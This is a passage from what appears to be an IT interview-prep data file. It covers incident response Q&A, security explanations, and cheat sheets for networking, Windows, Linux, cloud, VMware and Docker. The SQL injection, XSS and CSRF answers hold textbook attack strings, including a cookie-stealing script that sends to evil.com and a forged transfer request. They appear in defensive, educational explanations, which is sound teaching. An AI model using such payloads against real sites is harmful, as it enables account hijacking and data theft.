2. Timeline (specific timestamps):
   • When issue started, when monitoring detected it, when paged, each action taken, when resolved

3. Root Cause Analysis:
   • The technical cause — WHY did it break?

4. Contributing Factors:
   • What conditions allowed this? Missing test? No canary? Alert not configured?

5. What Went Well:
   • Rollback was fast, runbook was accurate, communication was clear

6. What Went Poorly:
   • Alert fired 20 minutes after the issue started, runbook was outdated

7. Action Items (most important):
   Each item has: description, owner, due date, priority
   Examples:
   • "Add integration test for DB connection failure" — @alice — 2 weeks
   • "Configure error rate alert on checkout-api" — @bob — 1 week
   • "Update rollback runbook" — @carol — 3 days`,
  },
  {
    id: 103, category: "Incident Response", difficulty: "Medium",
    q: "A bad deployment caused a production outage. What do you do?",
    a: `Priority: RESTORE SERVICE first, INVESTIGATE second.

Step 1 — Confirm it's the deployment:
• Did the incident start within minutes of the deploy? Almost certainly related.
kubectl rollout history deployment/web    # confirm deploy time matches incident start

Step 2 — Roll back immediately:
# Kubernetes:
kubectl rollout undo deployment/web
kubectl rollout status deployment/web    # watch pods roll out

# Helm:
helm rollback myapp                      # to previous release

# ArgoCD (GitOps):
• Revert the commit in the manifest repo OR click Rollback in ArgoCD UI

Step 3 — Verify service is restored:
• Watch error rate in Grafana — should drop to baseline
• Check kubectl get pods — all running, 0 restarts
• curl -f https://myapp.com/health

Step 4 — Communicate:
"14:45 UTC: Rolled back to previous version. Service is restoring. Monitoring closely."

Step 5 — Post-rollback investigation:
• What changed in the PR? (git diff previous-version..bad-version)
• Why didn't staging catch it?
• Write a test to cover the regression

Step 6 — Improve the pipeline:
• Bug detectable by test → add the test to CI
• Rollout was too fast → add canary deployment
• Rollback was slow → automate rollback on failed health checks`,
  },
  {
    id: 104, category: "Incident Response", difficulty: "Hard",
    q: "How do you diagnose a memory leak in a production application?",
    a: `Memory leaks cause gradual memory growth that never returns to baseline, eventually causing OOMKills.

Step 1 — Confirm it's a leak:
• Open Grafana, look at memory over 24-48 hours
• Leak pattern: steady upward trend that never drops back
• Normal: spikes with traffic, returns to baseline after

Step 2 — Identify the leaking container:
kubectl top pods --containers
kubectl describe pod <name>    # check Last State for OOMKilled history

Step 3 — Language-specific profiling:

Node.js:
• Enable --inspect flag → attach Chrome DevTools → take heap snapshots over time
• Use clinic.js or memwatch-next library

Python:
• tracemalloc.start(); snapshot = tracemalloc.take_snapshot()
• memory_profiler + @profile decorator

Java:
• jmap -heap <PID> → heap summary
• Generate heap dump: jmap -dump:format=b,file=heap.hprof <PID>
• Analyze with Eclipse MAT — look for objects with many retained references

Go:
• pprof endpoint: /debug/pprof/heap
• go tool pprof http://localhost:6060/debug/pprof/heap

Step 4 — Mitigate while fixing:
• Set memory limits in K8s — OOMKill restarts pod before it takes down the node
• Scale horizontally — more pods, each leaks slower relative to total

Step 5 — Fix and verify:
• Fix root cause (unclosed DB connections, growing cache, event listener leaks)
• Add a memory usage test in CI (run under load for X minutes, assert memory stays flat)`,
  },
  {
    id: 105, category: "Incident Response", difficulty: "Hard",
    q: "How do you investigate high latency in a distributed microservices application?",
    a: `Step 1 — Define the problem precisely:
• Is it p50 (everyone slow) or p99 (occasional slowness)?
• All requests or specific endpoints? All users or specific region?
• When did it start? What changed?

Step 2 — Start with distributed tracing (most efficient):
• Tools: Jaeger, Zipkin, Google Cloud Trace, Datadog APM
• Sample a slow trace — where does the time go? Which span is slow?
• Common finds: slow DB query, external API timeout, N+1 query problem

Step 3 — Check infrastructure:
# CPU saturation — requests queuing:
kubectl top pods; top on the node

# Disk I/O — affecting DB:
iostat -x 1 5

# Network packet loss:
netstat -s | grep retransmit

Step 4 — Check the database:
# Postgres slow queries:
SELECT pid, now() - query_start AS duration, query
FROM pg_stat_activity WHERE state = 'active'
ORDER BY duration DESC LIMIT 10;
EXPLAIN ANALYZE SELECT ...    # check query plan — missing index?

Step 5 — Check for resource exhaustion:
• Thread pool full? App queuing requests
• DB connection pool exhausted? App waits for a free connection
• Circuit breaker open?

Step 6 — Mitigate:
• Add caching (Redis) to reduce DB round-trips
• Add a missing database index
• Scale up the slow service horizontally
• Add timeouts and circuit breakers to prevent cascade`,
  },
  {
    id: 106, category: "Incident Response", difficulty: "Medium",
    q: "What does good on-call hygiene look like? How do you avoid on-call burnout?",
    a: `On-call rotation = taking turns being first responder for production incidents, typically 24/7 for a week at a time.

Alert quality (most important):
• Every alert must be actionable — if no action needed, don't page someone for it
• Each alert links to a runbook
• Regularly prune noisy alerts — if same alert fires and resolves on its own > 2x/week, fix it
• Alert on symptoms (high error rate, latency > SLO), not causes (high CPU — doesn't always mean user impact)

Runbooks:
• Step-by-step playbooks for common incident types stored in a wiki
• "If this alert fires, do exactly these steps" — reduces cognitive load at 2 AM
• Keep them up to date — stale runbooks are worse than none
• Include: who to escalate to, relevant dashboard links, commands to run

Shift handoff:
• At end of on-call shift: write a handoff note covering active issues, recent incidents
• Use a dedicated #oncall-handoff channel

Sustainable on-call (from Google SRE book):
• Track paging load: ideally < 2 incidents per on-call shift requiring human action
• Operations work < 50% of on-call time; rest is for elimination work
• If the same thing keeps paging → fix it permanently, don't just keep restarting it
• Offer comp time after a hard on-call week

Tools: PagerDuty, OpsGenie, Squadcast, Grafana OnCall — manage rotations and escalation policies`,
  },
  {
    id: 114, category: "Security", difficulty: "Medium",
    q: "What is SQL injection and how do you prevent it?",
    a: `SQL injection is when an attacker inserts malicious SQL code into an input field to manipulate the database query.

Example — vulnerable code:
query = "SELECT * FROM users WHERE username = '" + username + "'"

If username = "admin' OR '1'='1" the query becomes:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
→ Returns ALL users — authentication bypassed

Worse example — data destruction:
username = "'; DROP TABLE users; --"

PREVENTION:
1. Parameterized queries / prepared statements (PRIMARY FIX):
   cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
   Never concatenate user input into SQL strings

2. ORM (Object-Relational Mapper):
   User.objects.filter(username=username)  # Django — safe by default
   db.query(User).filter_by(username=username)  # SQLAlchemy

3. Input validation — whitelist expected formats
4. Least privilege — DB user should only have SELECT/INSERT, not DROP
5. WAF (Web Application Firewall) — blocks common SQLi patterns

Testing: sqlmap tool, OWASP ZAP, manual ' OR 1=1 -- tests`,
  },
  {
    id: 115, category: "Security", difficulty: "Medium",
    q: "What is XSS (Cross-Site Scripting) and how do you prevent it?",
    a: `XSS is when an attacker injects malicious JavaScript into a web page that other users view.

TYPES:
Stored XSS   — malicious script saved to DB, served to all visitors
              Example: forum post containing <script>steal_cookies()</script>

Reflected XSS — script in URL parameter, reflected back in response
              Example: search?q=<script>document.location='evil.com?c='+document.cookie</script>

DOM-based XSS — client-side JS reads attacker-controlled data and writes it to the DOM

IMPACT:
• Steal session cookies → hijack user accounts
• Keylog form inputs (passwords, credit cards)
• Redirect users to phishing sites
• Deface website

PREVENTION:
1. Output encoding — encode < > " ' & before rendering in HTML
   &lt; &gt; &quot; &#x27; &amp;
   Framework default: React escapes by default (dangerouslySetInnerHTML is dangerous!)

2. Content Security Policy (CSP) header:
   Content-Security-Policy: default-src 'self'; script-src 'self'
   Blocks inline scripts and external script sources

3. HttpOnly cookie flag — prevents JavaScript from reading cookies:
   Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

4. Input validation — reject unexpected characters
5. Use modern frameworks — React, Vue, Angular escape by default`,
  },
  {
    id: 116, category: "Security", difficulty: "Medium",
    q: "What is CSRF and how do you prevent it?",
    a: `CSRF (Cross-Site Request Forgery) — tricks a logged-in user's browser into making unwanted requests to a site they're authenticated on.

Example attack:
1. User logs into bank.com — session cookie stored in browser
2. User visits evil.com which contains:
   <img src="https://bank.com/transfer?to=attacker&amount=5000">
3. Browser automatically sends the request WITH the session cookie
4. Bank executes the transfer — user never clicked anything

PREVENTION:
1. CSRF Tokens (primary defense):
   • Server generates random token per session
   • Token included in every form as hidden field
   • Server validates token on every state-changing request
   • Attacker doesn't know the token → request rejected

2. SameSite cookie attribute:
   Set-Cookie: session=abc; SameSite=Strict
   • Strict: cookie never sent on cross-site requests
   • Lax: sent on top-level navigation only (good default)

3. Check Origin/Referer header:
   • Reject requests where Origin doesn't match your domain

4. Double submit cookie pattern:
   • Send CSRF token in both cookie and request body
   • Attacker can't read cookie from another domain

Note: GET requests should NEVER modify state — only POST/PUT/DELETE`,
  },
  {
    id: 117, category: "Security", difficulty: "Hard",
    q: "What is the OWASP Top 10 and why does it matter?",
    a: `OWASP Top 10 is the most critical web application security risks, updated every few years by the Open Web Application Security Project.

OWASP TOP 10 (2021):
A01 Broken Access Control    — users accessing data/actions they shouldn't
A02 Cryptographic Failures   — weak/missing encryption (plain text passwords, HTTP)
A03 Injection                — SQL, NoSQL, LDAP, OS command injection
A04 Insecure Design          — missing security controls in architecture
A05 Security Misconfiguration— default passwords, open cloud storage, verbose errors
A06 Vulnerable Components    — outdated libraries with known CVEs (log4shell, etc.)
A07 Auth Failures            — weak passwords, no MFA, session fixation
A08 Software/Data Integrity  — unverified updates, insecure CI/CD pipelines
A09 Logging Failures         — not logging security events, logs not monitored
A10 SSRF                     — server makes requests to internal resources on attacker's behalf

WHY IT MATTERS:
• Industry standard for security assessments and pentests
• Compliance frameworks (PCI-DSS, SOC2) reference it
• Security interviews frequently ask about it
• Most real-world breaches trace back to one of these 10

QUICK WINS TO COVER MOST RISKS:
• Parameterized queries → prevents A03
• Keep dependencies updated → prevents A06
• Enable MFA → prevents A07
• Use HTTPS everywhere → prevents A02
• Principle of least privilege → prevents A01`,
  },
  {
    id: 118, category: "Security", difficulty: "Medium",
    q: "What is the principle of least privilege and how do you apply it?",
    a: `Principle of Least Privilege (PoLP): every user, process, and system should have only the minimum access needed to do its job — nothing more.

WHY IT MATTERS:
• Limits blast radius if an account is compromised
• Reduces insider threat risk
• Makes audit trails more meaningful
• Required by most compliance frameworks (SOC2, ISO27001, PCI-DSS)

APPLICATIONS:

Linux/servers:
• Don't run apps as root — create dedicated service accounts
• File permissions: 644 for files, 755 for dirs (not 777)
• sudo: grant specific commands only (NOPASSWD: /bin/systemctl restart nginx)

Active Directory:
• Users get standard accounts + separate admin account
• Admin accounts only used when needed, not for email/browsing
• Service accounts get only the permissions they need

Cloud (IAM):
• No primitive roles (Owner/Editor) in production
• Use predefined roles (roles/storage.objectViewer)
• Service accounts per application, not shared
• Regularly audit and remove unused permissions

Kubernetes:
• RBAC: create Roles scoped to specific namespaces
• Avoid ClusterAdmin for regular workloads
• Service accounts per deployment

Database:
• App DB user: SELECT, INSERT, UPDATE only
• Never give app user DROP, CREATE, or GRANT privileges
• Separate read-only replica user for reporting queries`,
  },
  {
    id: 119, category: "Security", difficulty: "Medium",
    q: "What is a firewall and what are the differences between stateful and stateless firewalls?",
    a: `A firewall controls network traffic by allowing or blocking packets based on defined rules.

STATELESS FIREWALL:
• Examines each packet in isolation
• Rules based on: source IP, dest IP, port, protocol
• Does NOT track connection state
• Fast, simple, low overhead
• Examples: basic ACLs on routers, AWS NACLs

STATEFUL FIREWALL:
• Tracks the STATE of active connections
• Knows if a packet is part of an established connection
• Automatically allows return traffic for outbound connections
• More intelligent, catches more attack types
• Examples: AWS Security Groups, Windows Firewall, iptables with conntrack

Example difference:
Stateless: You need explicit rules for BOTH outbound and return traffic
Stateful:  Allow outbound 443 → return traffic automatically allowed

TYPES:
Packet filter    — Layer 3/4, IP/port based (stateless)
Stateful         — tracks TCP connection state
Application (L7) — understands HTTP/DNS/etc, blocks based on content
WAF              — specializes in web app traffic (HTTP)
NGFW             — combines all of the above (Palo Alto, Fortinet)

iptables (Linux) basics:
iptables -A INPUT -p tcp --dport 22 -j ACCEPT    Allow SSH
iptables -A INPUT -j DROP                         Drop everything else`,
  },
  {
    id: 120, category: "Security", difficulty: "Hard",
    q: "What is a penetration test and what are the main phases?",
    a: `Penetration testing (pentesting) = authorized simulated attack on a system to find vulnerabilities before real attackers do.

KEY DISTINCTION:
• Pentest = authorized, legal, scoped, documented
• Hacking = unauthorized — even well-intentioned is illegal
• Always get written authorization (Rules of Engagement) before testing

PENTEST PHASES (PTES standard):
1. Pre-engagement
   • Define scope (what systems, what's out of bounds)
   • Rules of engagement (hours allowed, can you use DoS?)
   • Get written authorization signed

2. Reconnaissance (OSINT)
   • Passive: LinkedIn, DNS records, Shodan, job listings
   • Active: port scans, service enumeration
   • Tools: nmap, theHarvester, Shodan, whois

3. Scanning & Enumeration
   • nmap -sV -sC target    Service versions + default scripts
   • Identify OS, open ports, running services, software versions
   • Check for known CVEs on discovered versions

4. Exploitation
   • Try to exploit discovered vulnerabilities
   • Tools: Metasploit, manual exploits, custom scripts
   • Goal: gain access — not cause damage

5. Post-Exploitation
   • What can you do with access? (privilege escalation, lateral movement)
   • Assess real business impact

6. Reporting
   • Document every finding with: severity, evidence, reproduction steps
   • Include remediation recommendations
   • Executive summary + technical details

TYPES: Black box (no info), White box (full info), Gray box (partial)`,
  },
];

// ── CHEAT SHEETS ──────────────────────────────────────────────────────────────
export const CHEAT_SHEETS = [
  {
    id: "networking",
    title: "Networking",
    emoji: "🌐",
    sections: [
      {
        title: "OSI Model Layers",
        content: `7 - Application    HTTP, FTP, DNS, SMTP, SSH
6 - Presentation   SSL/TLS, encryption, JPEG/MP4
5 - Session        Session setup/teardown
4 - Transport      TCP (reliable), UDP (fast) — PORTS live here
3 - Network        IP addressing, routing — routers
2 - Data Link      MAC addresses, switches, Ethernet frames
1 - Physical       Cables, NICs, hubs, signals

Mnemonic (top→down): All People Seem To Need Data Processing`
      },
      {
        title: "Critical Port Numbers",
        content: `20/21  FTP (data/control)      TCP
22     SSH                      TCP
23     Telnet (insecure)        TCP
25     SMTP (email send)        TCP
53     DNS                      UDP/TCP
67/68  DHCP (server/client)     UDP
80     HTTP                     TCP
88     Kerberos (AD auth)       TCP/UDP
110    POP3                     TCP
143    IMAP                     TCP
389    LDAP (Active Directory)  TCP
443    HTTPS                    TCP
445    SMB (Windows shares)     TCP
636    LDAPS (LDAP secure)      TCP
3389   RDP (Remote Desktop)     TCP`
      },
      {
        title: "TCP vs UDP",
        content: `TCP                          UDP
────────────────────────     ────────────────────────
Connection-oriented          Connectionless
3-way handshake (SYN→       No handshake
 SYN-ACK→ACK)
Reliable, retransmits        Best-effort, no retry
Ordered delivery             Order not guaranteed
Slower (overhead)            Faster
HTTP/HTTPS, SSH, FTP,        DNS, DHCP, VoIP,
email, RDP                   video stream, gaming`
      },
      {
        title: "IP Subnetting Quick Reference",
        content: `CIDR   Subnet Mask       Hosts   Block
/30    255.255.255.252   2       4
/29    255.255.255.248   6       8
/28    255.255.255.240   14      16
/27    255.255.255.224   30      32
/26    255.255.255.192   62      64
/25    255.255.255.128   126     128
/24    255.255.255.0     254     256
/23    255.255.254.0     510     512
/22    255.255.252.0     1022    1024
/16    255.255.0.0       65534   65536

Private ranges (not routable on internet):
10.0.0.0/8         (Class A — large enterprise)
172.16.0.0/12      (Class B — medium)
192.168.0.0/16     (Class C — home/small office)`
      },
      {
        title: "DHCP Process (DORA)",
        content: `D - Discover   Client broadcasts "I need an IP" (UDP 68→67)
O - Offer      Server offers an IP + lease info
R - Request    Client says "I'll take that one"
A - Acknowledge Server confirms the lease

DHCP provides: IP, Subnet Mask, Default Gateway, DNS, Lease time

Troubleshooting:
• 169.254.x.x (APIPA) = DHCP server unreachable
• ipconfig /release && ipconfig /renew = renew lease
• ipconfig /flushdns = clear DNS cache`
      },
      {
        title: "DNS Record Types",
        content: `A       Domain → IPv4 address      (google.com → 142.x.x.x)
AAAA    Domain → IPv6 address
CNAME   Alias → another domain     (www → root domain)
MX      Mail server for domain
PTR     IP → Domain (reverse DNS)
NS      Nameserver for domain
TXT     Text records (SPF, DKIM verification)
SOA     Start of Authority (zone info)

Tools: nslookup google.com | dig google.com | host google.com`
      },
    ]
  },
  {
    id: "windows",
    title: "Windows / AD",
    emoji: "🪟",
    sections: [
      {
        title: "Active Directory Structure",
        content: `Forest (top level — trust boundary)
  └── Domain (e.g. company.local)
        └── Organizational Units (OUs) — like folders
              ├── Users
              ├── Computers
              ├── Groups
              └── Sub-OUs (by department/location)

Key components:
• Domain Controller (DC) — holds NTDS.DIT database
• Global Catalog — cross-domain search
• FSMO Roles — 5 special DC roles (PDC Emulator, RID Master, etc.)
• Kerberos (port 88) — primary authentication
• LDAP (port 389) — directory queries`
      },
      {
        title: "Essential CMD/PowerShell Commands",
        content: `NETWORKING:
ipconfig /all              Show IP, MAC, DNS, gateway
ipconfig /flushdns         Clear DNS cache
ping [host]                Test connectivity
tracert [host]             Trace route
nslookup [domain]          DNS query
netstat -an                Active connections + ports
arp -a                     ARP table (IP→MAC)
pathping [host]            Detailed route + packet loss

SYSTEM:
systeminfo                 OS info, uptime, hotfixes
tasklist                   Running processes
taskkill /PID 1234 /F      Force kill process
gpupdate /force            Apply Group Policy now
gpresult /r                Show applied GPOs
sfc /scannow               Repair corrupted system files
chkdsk C: /f               Check+fix disk errors (reboot needed)
net user [user]            User account info
net user [user] * /domain  Reset domain password (prompts)
net localgroup admins      List local administrators`
      },
      {
        title: "NTFS vs Share Permissions",
        content: `NTFS (local + network):      SHARE (network only):
Full Control                 Full Control
Modify                       Change
Read & Execute               Read
List Folder Contents
Read
Write

Rule: When BOTH apply → MORE RESTRICTIVE wins

Best practice:
• Share: Everyone → Full Control
• NTFS: set granular permissions here
• This way you manage access in one place

Set NTFS: Right-click folder → Properties → Security
Set Share: Right-click → Properties → Sharing → Advanced Sharing`
      },
      {
        title: "Group Policy (GPO) Quick Ref",
        content: `Processing order (LSDOU — last wins):
Local → Site → Domain → OU

Key commands:
gpupdate /force            Apply immediately
gpresult /r                Show effective policies
rsop.msc                   Resultant Set of Policy (GUI)
gpresult /H report.html    Generate HTML report

Common GPO uses:
• Password policy (length, complexity, expiry)
• Software deployment / restriction
• Map network drives at login
• Set screensaver + lock after X minutes
• Disable USB storage
• Windows Firewall settings
• Deploy printer connections`
      },
      {
        title: "Event Viewer — Key Event IDs",
        content: `Security Log:
4624   Successful logon
4625   Failed logon attempt
4634   Logoff
4648   Explicit credential logon (runas)
4720   User account created
4722   User account enabled
4725   User account disabled
4740   Account locked out ← CRITICAL for lockout troubleshooting
4767   Account unlocked
4776   Credential validation (NTLM)

System Log:
6005   Event Log service started (system boot)
6006   Event Log service stopped (clean shutdown)
6008   Unexpected shutdown
41     Kernel-Power (unexpected reboot/crash)
7045   New service installed ← watch for malware

Application Log:
1000   Application error/crash`
      },
    ]
  },
  {
    id: "linux",
    title: "Linux",
    emoji: "🐧",
    sections: [
      {
        title: "File System Hierarchy",
        content: `/           Root — top of everything
/bin        Essential binaries (ls, cp, mv, ping)
/sbin       System binaries (for root: fdisk, ifconfig)
/etc        Configuration files (hosts, passwd, ssh/sshd_config)
/home       User home directories (/home/garry)
/root       Root user's home
/var        Variable data — logs (/var/log), spool, tmp
/var/log    System logs (syslog, auth.log, messages)
/tmp        Temporary files (cleared on reboot)
/usr        User programs, libraries, documentation
/opt        Optional/third-party software
/dev        Device files (disks: /dev/sda, /dev/nvme0n1)
/proc       Virtual FS — running processes, kernel info
/sys        Virtual FS — hardware/kernel parameters
/mnt /media Mount points for filesystems`
      },
      {
        title: "File Permissions (chmod)",
        content: `Format: [type][owner][group][others]
Example: -rwxr-xr--

Types: - (file)  d (dir)  l (symlink)

Permission bits:  r=4  w=2  x=1
rwx = 7,  rw- = 6,  r-x = 5,  r-- = 4

Common permission sets:
755  rwxr-xr-x  Executables, public dirs
644  rw-r--r--  Regular files, config files
600  rw-------  Private keys, sensitive files
700  rwx------  Private directories
777  rwxrwxrwx  ⚠️ Avoid — everyone can write

Commands:
chmod 755 script.sh          Numeric
chmod +x script.sh           Add execute for all
chmod -R 755 /var/www        Recursive
chown user:group file        Change owner + group
chown -R john:john /home/john Recursive`
      },
      {
        title: "Process Management",
        content: `VIEWING:
ps aux                    All running processes
ps aux | grep nginx       Find specific process
top                       Live process monitor
htop                      Better interactive monitor (install separately)
pgrep nginx               Get PID by name

KILLING:
kill [PID]                Send SIGTERM (graceful)
kill -9 [PID]             Send SIGKILL (force, no cleanup)
killall nginx             Kill by name
pkill -f "python script"  Kill by pattern

BACKGROUND:
command &                 Run in background
jobs                      List background jobs
fg %1                     Bring job 1 to foreground
bg %1                     Resume job 1 in background
nohup command &           Run after logout (immune to hangup)
screen / tmux             Terminal multiplexers (persistent sessions)`
      },
      {
        title: "systemd Service Management",
        content: `systemctl status nginx         Is it running?
systemctl start nginx          Start
systemctl stop nginx           Stop
systemctl restart nginx        Restart (downtime)
systemctl reload nginx         Reload config (no downtime)
systemctl enable nginx         Auto-start on boot
systemctl disable nginx        Don't auto-start
systemctl is-active nginx      Quick status check
systemctl list-units --type=service   All services

LOGS:
journalctl -u nginx            All logs for nginx
journalctl -u nginx -f         Follow live (like tail -f)
journalctl -u nginx -n 50      Last 50 lines
journalctl --since "2h ago"    Logs from last 2 hours
journalctl -p err              Error-level and above
journalctl -b                  Since last boot`
      },
      {
        title: "Networking Commands",
        content: `ip addr show                   Show all interfaces + IPs
ip addr show eth0              Specific interface
ip route show                  Routing table
ip link set eth0 up/down       Enable/disable interface

ss -tulnp                      Open ports + listening services
  -t TCP  -u UDP  -l listening  -n numeric  -p process

ping -c 4 google.com           4 pings
traceroute google.com          Trace route
mtr google.com                 Live traceroute
curl -I https://google.com     HTTP headers only
wget URL                       Download file

DNS:
nslookup domain                Basic DNS query
dig domain                     Detailed DNS query
dig domain MX                  MX records
host domain                    Quick lookup
cat /etc/resolv.conf           DNS server config
cat /etc/hosts                 Local hostname overrides`
      },
      {
        title: "Package Managers",
        content: `DEBIAN / UBUNTU (APT):
apt update                     Refresh package lists
apt upgrade                    Upgrade installed packages
apt install nginx              Install
apt remove nginx               Remove (keep config)
apt purge nginx                Remove + delete config
apt search nginx               Search
apt show nginx                 Package info
dpkg -l                        List all installed
dpkg -l | grep nginx           Check if installed

RHEL / CENTOS / FEDORA (YUM/DNF):
dnf update                     Update all
dnf install httpd              Install
dnf remove httpd               Remove
dnf search httpd               Search
rpm -qa                        List all installed RPMs
rpm -qa | grep httpd           Check specific

BOTH: never run apt/yum as regular user, always use sudo`
      },
    ]
  },
  {
    id: "cloud",
    title: "Cloud (GCP/AWS)",
    emoji: "☁️",
    sections: [
      {
        title: "Service Models",
        content: `You manage ↑ more = more control, more work

         On-Prem  IaaS    PaaS    SaaS
Apps         ✅      ✅      ✅      ❌
Data         ✅      ✅      ✅      ❌
Runtime      ✅      ✅      ❌      ❌
Middleware   ✅      ✅      ❌      ❌
OS           ✅      ✅      ❌      ❌
Virtualiztn  ✅      ❌      ❌      ❌
Servers      ✅      ❌      ❌      ❌
Storage      ✅      ❌      ❌      ❌
Networking   ✅      ❌      ❌      ❌

✅ = YOU manage   ❌ = Provider manages

IaaS: GCP Compute Engine, AWS EC2, Azure VMs
PaaS: GCP App Engine, Heroku, Azure App Service
SaaS: Gmail, Office 365, Salesforce, Slack`
      },
      {
        title: "GCP Core Services",
        content: `COMPUTE:
Compute Engine (GCE)   VMs (IaaS)
GKE                    Kubernetes (containers)
Cloud Run              Serverless containers
App Engine             PaaS — just deploy code
Cloud Functions        Serverless event-driven

STORAGE:
Cloud Storage (GCS)    Object storage (like S3) — buckets
Persistent Disk        Block storage for VMs
Filestore              Managed NFS (file shares)

DATABASES:
Cloud SQL              Managed MySQL/PostgreSQL/SQL Server
Firestore              NoSQL document DB
Bigtable               Wide-column NoSQL (analytics)
Spanner                Global distributed relational DB

NETWORKING:
VPC                    Virtual Private Cloud
Cloud Load Balancing   HTTP(S), TCP, UDP load balancing
Cloud DNS              Managed DNS
Cloud NAT              Outbound NAT for private VMs
Cloud CDN              Content Delivery Network

SECURITY & IDENTITY:
Cloud IAM              Access control
Cloud KMS              Key Management
Secret Manager         Store API keys/passwords securely`
      },
      {
        title: "IAM — Identity & Access Management",
        content: `Core concept: WHO can do WHAT on WHICH resource

Principals (who):
• Google Account (user@gmail.com)
• Service Account (app-sa@project.iam.gserviceaccount.com)
• Google Group
• Cloud Identity domain

Roles (what):
• Primitive: Owner > Editor > Viewer (too broad — avoid)
• Predefined: roles/compute.viewer, roles/storage.objectAdmin
• Custom: define exactly what's allowed

Binding: Principal + Role + Resource = Policy

GCloud commands:
gcloud projects add-iam-policy-binding PROJECT \
  --member="user:email@example.com" \
  --role="roles/viewer"

gcloud projects get-iam-policy PROJECT   # view current policies

Principle of Least Privilege:
Grant only the minimum permissions needed.
Use service accounts for applications, not user accounts.
Rotate service account keys regularly.`
      },
      {
        title: "AWS Core Services (comparison)",
        content: `GCP → AWS equivalents:
GCE (Compute Engine) → EC2
GCS (Cloud Storage)  → S3
GKE                  → EKS
Cloud SQL            → RDS
Cloud Functions      → Lambda
Cloud Run            → Fargate / ECS
VPC                  → VPC (same concept)
Cloud IAM            → IAM (same concept)
Cloud DNS            → Route 53
Cloud Load Balancing → ELB (ALB/NLB/CLB)
Cloud CDN            → CloudFront
Secret Manager       → Secrets Manager
Cloud KMS            → AWS KMS

AWS pricing model: pay-as-you-go (same as GCP)
AWS regions > Availability Zones (AZs) — multiple datacenters per region
Design for multi-AZ = high availability`
      },
    ]
  },
  {
    id: "vmware",
    title: "VMware",
    emoji: "🖥️",
    sections: [
      {
        title: "VMware vSphere Stack",
        content: `vSphere = the full product suite (not a single product)

ESXi (hypervisor):
• Bare-metal Type 1 hypervisor — installs on physical server
• Runs VMs — each VM gets virtual CPU, RAM, disk, NIC
• Web UI: vSphere Host Client (browser)
• Free version available (limited features)

vCenter Server:
• Centralized management for multiple ESXi hosts
• Unlocks enterprise features (HA, DRS, vMotion)
• Web UI: vSphere Client (HTML5)
• Database backend: embedded PostgreSQL or external

vSphere Hierarchy:
vCenter
 └── Datacenter
      └── Cluster
           └── ESXi Host(s)
                └── VMs
                     └── VM files on Datastore`
      },
      {
        title: "Hypervisor Types",
        content: `TYPE 1 — Bare Metal (Enterprise):
• Runs directly on hardware
• No host OS layer
• More efficient, better performance
• Examples: VMware ESXi, Microsoft Hyper-V,
  Citrix XenServer, KVM (Linux kernel)

TYPE 2 — Hosted (Desktop/Dev):
• Runs on top of an existing OS
• Extra abstraction layer = less efficient
• Easier to install, good for dev/testing
• Examples: VMware Workstation, VMware Fusion (Mac),
  Oracle VirtualBox, Parallels Desktop

In enterprise IT: almost always Type 1 (ESXi)
On developer laptops: Type 2 (VirtualBox, Workstation)`
      },
      {
        title: "vMotion & Migration Types",
        content: `vMotion (live migration):
• Moves a RUNNING VM between ESXi hosts
• Zero downtime — user doesn't notice
• Requires: shared storage + compatible CPUs + vMotion network
• Use case: host maintenance, load balancing

Storage vMotion:
• Moves a running VM's disk between datastores
• No shared storage needed
• Use case: moving from old SAN to new storage

Cold Migration:
• VM is powered off → move to different host/datastore
• Can move to different cluster/datacenter
• Simpler, no vMotion license required

DRS (Distributed Resource Scheduler):
• Uses vMotion automatically to balance CPU/RAM across cluster
• Policies: Manual / Partially Automated / Fully Automated

HA (High Availability):
• Monitors ESXi hosts
• If a host fails → VMs restart on surviving hosts automatically
• Recovery time: ~2-5 minutes (not instant)`
      },
      {
        title: "VM Snapshots",
        content: `What a snapshot captures:
• VM disk state (all data at that moment)
• VM memory state (optional — if "Snapshot the VM's memory")
• VM settings/config

How snapshots work:
1. Original VMDK becomes read-only
2. New delta file created — all writes go here
3. Revert: discard delta → back to original state instantly
4. Delete/commit: merge delta into base (slow, I/O intensive)

Snapshot chain risks:
• Each level adds performance overhead
• Delta files grow continuously
• Filled datastore = VM crash (writes fail)
• Large delta files take hours to commit

Best practices:
• Use only for: pre-patch, pre-risky-change
• Delete within 24-72 hours
• Max 2-3 levels in chain
• Monitor snapshot size in vCenter
• ⚠️ NOT a backup — use Veeam/Commvault for real backups

Taking a snapshot via PowerCLI:
Get-VM "VMName" | New-Snapshot -Name "Pre-Patch-$(Get-Date -Format yyyyMMdd)"`
      },
    ]
  },
  {
    id: "docker",
    title: "Docker",
    emoji: "🐋",
    sections: [
      {
        title: "Core Concepts",
        content: `Image      — read-only blueprint (layers stacked on base OS)
Container  — running instance of an image (isolated process)
Registry   — server that stores/distributes images (Docker Hub, GCR)
Volume     — persistent storage that survives container removal
Network    — virtual network connecting containers

Key difference from VMs:
• VM: full OS per machine (GBs, minutes to start)
• Container: shares host kernel, just app + deps (MBs, seconds to start)

Image layers are cached — only changed layers rebuild on docker build`
      },
      {
        title: "Essential Commands",
        content: `IMAGES:
docker pull nginx:latest           Download image
docker images                      List local images
docker rmi nginx:latest            Remove image
docker build -t myapp:v1 .         Build from Dockerfile in current dir
docker tag myapp:v1 user/myapp:v1  Tag for pushing

CONTAINERS:
docker run -d -p 8080:80 nginx     Run detached, map port 8080→80
docker run -it ubuntu bash         Interactive shell
docker ps                          Running containers
docker ps -a                       All containers (including stopped)
docker stop <id>                   Graceful stop (SIGTERM)
docker rm <id>                     Remove stopped container
docker exec -it <id> bash          Shell into running container
docker logs <id>                   View container logs
docker logs -f <id>                Follow logs live

CLEANUP:
docker system prune                Remove stopped containers + dangling images
docker system prune -af            Remove ALL unused resources (careful in prod!)`
      },
      {
        title: "Dockerfile Reference",
        content: `FROM node:20-alpine          Base image (always first)
WORKDIR /app                 Set working directory
COPY package*.json ./        Copy specific files first (layer cache!)
RUN npm install              Run during BUILD
COPY . .                     Copy rest of source
EXPOSE 3000                  Document port (doesn't actually open it)
ENV NODE_ENV=production      Set environment variable
CMD ["node", "server.js"]    Default command at runtime

Build cache tip:
• Copy package.json BEFORE copying source code
• npm install only re-runs when package.json changes
• Source code changes don't invalidate the npm install layer

Multi-stage build (keeps final image small):
FROM node:20 AS builder
WORKDIR /app
COPY . .
RUN npm run build

FROM nginx:alpine
COPY --from=builder /app/build /usr/share/nginx/html`
      },
      {
        title: "Docker Compose",
        content: `docker-compose.yml — defines multi-container apps
